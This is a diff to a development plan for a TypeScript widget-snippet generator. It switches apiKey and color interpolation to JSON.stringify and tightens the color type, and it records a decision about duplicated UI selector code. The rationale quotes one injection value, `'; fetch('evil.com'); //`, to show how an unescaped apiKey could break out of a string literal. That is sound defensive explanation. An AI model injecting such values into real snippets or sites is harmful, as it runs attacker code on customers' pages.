@@ -1892,7 +1892,7 @@ export const WIDGET_FRAMEWORKS = ["html", "react", "angular"] as const;
 export interface WidgetSnippetConfig {
   /** the real API key, or a placeholder like "YOUR_API_KEY" */
   apiKey: string;
-  color: string;
+  color: (typeof WIDGET_COLORS)[number]["value"];
   shape: (typeof WIDGET_SHAPES)[number];
   position: (typeof WIDGET_POSITIONS)[number];
   framework: (typeof WIDGET_FRAMEWORKS)[number];
@@ -1910,14 +1910,14 @@ export function buildWidgetSnippet({
   if (framework === "react") {
     return `import { useEffect } from 'react';
 
-const INSIGHT_STREAM_API_KEY = '${apiKey}';
+const INSIGHT_STREAM_API_KEY = ${JSON.stringify(apiKey)};
 
 export default function InsightStreamWidget() {
   useEffect(() => {
     // 1. Set configuration
     (window as any).InsightStreamConfig = {
       apiKey: INSIGHT_STREAM_API_KEY,
-      color: '${color}',
+      color: ${JSON.stringify(color)},
       shape: '${shape}',
       position: '${position}'
     };
@@ -1943,7 +1943,7 @@ export default function InsightStreamWidget() {
   if (framework === "angular") {
     return `import { Component, OnInit, OnDestroy } from '@angular/core';
 
-const INSIGHT_STREAM_API_KEY = '${apiKey}';
+const INSIGHT_STREAM_API_KEY = ${JSON.stringify(apiKey)};
 
 @Component({
   selector: 'app-insight-stream',
@@ -1956,7 +1956,7 @@ export class InsightStreamComponent implements OnInit, OnDestroy {
   ngOnInit() {
     (window as any).InsightStreamConfig = {
       apiKey: INSIGHT_STREAM_API_KEY,
-      color: '${color}',
+      color: ${JSON.stringify(color)},
       shape: '${shape}',
       position: '${position}'
     };
@@ -1978,8 +1978,8 @@ export class InsightStreamComponent implements OnInit, OnDestroy {
   return `<!-- InsightStream AI Widget -->
 <script id="insight-stream-config">
   window.InsightStreamConfig = {
-    apiKey: '${apiKey}',
-    color: '${color}',
+    apiKey: ${JSON.stringify(apiKey)},
+    color: ${JSON.stringify(color)},
     shape: '${shape}',
     position: '${position}'
   };
@@ -1987,6 +1987,8 @@ export class InsightStreamComponent implements OnInit, OnDestroy {
 <script src="${scriptUrl}"></script>`;
 }
 ```
+
+`color` is now typed `(typeof WIDGET_COLORS)[number]["value"]` instead of bare `string`, and `apiKey`/`color` interpolate via `JSON.stringify(...)` instead of manual `'${...}'` quoting — found in code review, on the last task of Phase 1. Neither is exploitable with any current caller (`apiKey` is always `crypto.randomUUID()` or the literal placeholder `"YOUR_API_KEY"`; `color` only ever comes from `WIDGET_COLORS`), but a first draft's bare `string`/manual-quote handling meant a future free-text `apiKey` or `color` (unlike the type-safe `shape`/`position`/`framework`, which are already literal unions) would have no compiler warning and could break out of the string literal in the generated snippet — e.g. an `apiKey` containing `'; fetch('evil.com'); //` would inject executable code into a customer's own site when they paste the snippet. `JSON.stringify` on a string always produces a syntactically valid, correctly-escaped literal regardless of input, closing that class of bug for near-zero cost. `shape`/`position` interpolations are left as plain `'${...}'` since their types are already closed literal unions with no unsafe values possible.
 
 - [ ] **Step 2: Create `WidgetConfigForm`**
 
@@ -2006,8 +2008,8 @@ import {
 } from "@/lib/widgetSnippet";
 
 interface WidgetConfigFormProps {
-  color: string;
-  onColorChange: (value: string) => void;
+  color: (typeof WIDGET_COLORS)[number]["value"];
+  onColorChange: (value: (typeof WIDGET_COLORS)[number]["value"]) => void;
   shape: (typeof WIDGET_SHAPES)[number];
   onShapeChange: (value: (typeof WIDGET_SHAPES)[number]) => void;
   position: (typeof WIDGET_POSITIONS)[number];
@@ -2118,6 +2120,8 @@ export function WidgetConfigForm({
   );
 }
 ```
+
+**Deliberate decision, not an oversight (found in code review):** the shape/position/framework selectors above hand-roll the exact "pill group in a bordered `bg-brand-bg` track" pattern that Task 6's `SegmentedControl` primitive already exists to consolidate — same container classes, same selected/unselected button classes. This is real, avoidable duplication within Phase 1 itself, on its own last task. It was not consolidated onto `SegmentedControl` because that primitive currently hardcodes a single `min-w-[80px]` for every button (added in Task 6), while these three selectors need different widths (90px for shape labels like "Rounded", 110px for position labels like "Bottom Left", 80px for framework) to avoid text wrapping — `SegmentedControl`'s `className` prop only reaches the outer container, not per-button width. Cleanly supporting this would mean adding a component- or option-level width knob to `SegmentedControl` for a primitive that's supposed to stay simple, the same over-generalization concern Task 6's `StatusTabs` decision already weighed and declined. Framework's "HTML" label (uppercase, unlike the other lowercase-then-capitalized labels) also doesn't fit `SegmentedOption`'s plain-string-label model without preprocessing. Tracked as a known, accepted gap rather than fixed silently or fixed by widening `SegmentedControl`'s API for a single caller — revisit if a third consumer needing variable per-button widths appears.
 
 - [ ] **Step 3: Create its story**
 
